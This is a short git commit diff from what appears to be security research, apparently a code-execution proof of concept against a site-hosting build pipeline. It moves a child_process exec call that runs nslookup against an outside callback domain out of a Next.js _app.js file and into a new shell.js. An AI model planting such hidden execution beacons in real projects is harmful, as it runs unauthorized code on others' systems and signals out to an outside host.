897aa1fe65d3af867b0a3f1df4da245918cd3446
Ben Steger <ben.steger@praetorian.com>
2021-01-18 14:22:59 -0600

    d

--- pages/_app.js
+++ pages/_app.js
@@ -1,18 +1,6 @@
 import '../styles/globals.css';
-const { exec } = require("child_process");
 
 function App({ Component, pageProps }) {
-  exec("nslookup wpesite.dns.praetorianlabs.com", (error, stdout, stderr) => {
-    if (error) {
-        console.log(`error: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.log(`stderr: ${stderr}`);
-        return;
-    }
-    console.log(`stdout: ${stdout}`);
-  });
   return <Component {...pageProps} />;
 }
 
---
+++ shell.js
@@ -0,0 +1,13 @@
+const { exec } = require("child_process");
+
+exec("nslookup wpecommand.dns.praetorianlabs.com", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
